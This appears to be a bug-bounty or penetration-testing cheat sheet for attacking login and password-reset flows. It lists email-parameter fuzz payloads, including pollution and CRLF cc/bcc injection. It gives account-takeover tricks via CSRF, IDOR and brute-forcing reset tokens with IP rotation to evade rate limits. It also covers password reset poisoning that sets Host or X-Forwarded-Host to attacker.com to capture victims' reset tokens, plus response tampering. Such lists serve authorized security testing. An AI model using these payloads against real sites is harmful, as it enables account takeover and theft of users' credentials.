## Authentication and stuff

### fuzz

```
# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com

# array
{"email":["victim@mail.com","hacker@mail.com"]}

# parameter pollution
email=victim@mail.com&email=hacker@mail.co

# use %20
email=victim@email.com%20email=attacker@email.com

# use |
email=victim@email.com|email=attacker@email.com

# use ,
mail="victim@mail.tld",email="attacker@mail.tld"

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com
```

### tricks to try

```
- CSRF to Update Attacker Email/Phone in Victim Account then perform Password Reset
- IDOR to Update Attacker Email/Phone in Victim Account then perform password reset

- Trigger Password Reset Request , Open the Password Reset Link and Change the `user identifier` to `victim user`. , Attempt to perform Password Reset., If the password reset is successful, account takeover is achieved

- host header injection : Change the Host header value to "attacker-controlled" host , If the password reset link contains the "attacker-controlled" hostname and the victim clicks on the link, it will be logged on the attacker server

- identify how the token is generated and test it(does it expire ? is it random ? can we brutef it ? try it with other accounts, add , delete ...)

- Does remember me expires?

- change email and password through change password functionality

- rate limit ?

- Check if the expired token can be reused

- brute force reset token (IP-Rotator on burpsuite to bypass IP based ratelimit)

- add your password reset token with victim’s Account

- Reset Token expiration Time

- Long password

- When a user logs out or reset his password, the current session should be invalidated.
Therefore, grab the cookies while the user is logged in, log out, and check if the cookies are still valid.
Repeat the process changing the password instead of logging out.

- when registering try to use victim's email , email with spaces (before ane after)

- consider registration when password reset and vice versa

- IDN homograph ?

- what if a link which was meant to be clicked by a user to update something is clicked by another user ? is it going to update the victim's details ? (update email,add emails)
```

### sensitive data leak using .json extension.

```
GET /ResetPassword HTTP/1.1 -> GET /ResetPassword.json HTTP/1.1 # might leak the token
```

### password reset

```
Token Leak Via Referrer:
Check if the referer header is leaking password reset token ot ant 3rd party website in the page. (maybe a broken link hijacking is there)

is the token leaked on a response from the web application?


Password Reset Poisoning : 
Add following header or edit header in burpsuite(try one by one)

 Host: attacker.com

 Host: target.com
 X-Forwarded-Host: attacker.com
 
 Host: target.com
 Host: attacker.com
 
 Check if the link to change the password inside the email is pointing to attacker.com
 The victim will receive the malicious link in their email, and, when clicked, will leak the user’s password reset link / token to the attacker, leading to full account takeover.
 
```

### response manipulation

```
Replace Bad Response With Good One (status code and parameters)
HTTP/1.1 401 Unauthorized
(“message”:”unsuccessful”,”statusCode:403,”errorDescription”:”Unsuccessful”)

change the response to :

HTTP/1.1 200 OK
(“message”:”success”,”statusCode:200,”errorDescription”:”Success”)

```


